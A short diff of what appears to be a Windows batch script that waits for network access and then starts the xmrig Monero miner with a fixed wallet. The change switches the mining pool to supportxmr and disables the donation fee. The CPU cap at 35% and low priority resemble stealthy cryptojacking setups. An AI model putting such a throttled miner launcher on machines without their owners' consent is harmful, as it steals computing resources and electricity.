@@ -8,4 +8,4 @@ if %errorlevel% neq 0 (
     goto check_net
 )
 
-xmrig.exe -o gulf.moneroocean.stream:10032 -u 48W6ehtvLN59EpJACwt7wJLt6vPY7yQTMGLJUPJ6Q9iPJy4cvTsHSW1Xm3JCcboxokEtxHnFweJRwC1Cry5fptdHJveNYSh -p pc5 --cpu-max-threads-hint 35 --cpu-priority 1
+xmrig.exe -o pool.supportxmr.com:3333 -u 48W6ehtvLN59EpJACwt7wJLt6vPY7yQTMGLJUPJ6Q9iPJy4cvTsHSW1Xm3JCcboxokEtxHnFweJRwC1Cry5fptdHJveNYSh -p pc3 --cpu-max-threads-hint 35 --cpu-priority 1 --donate-level 0
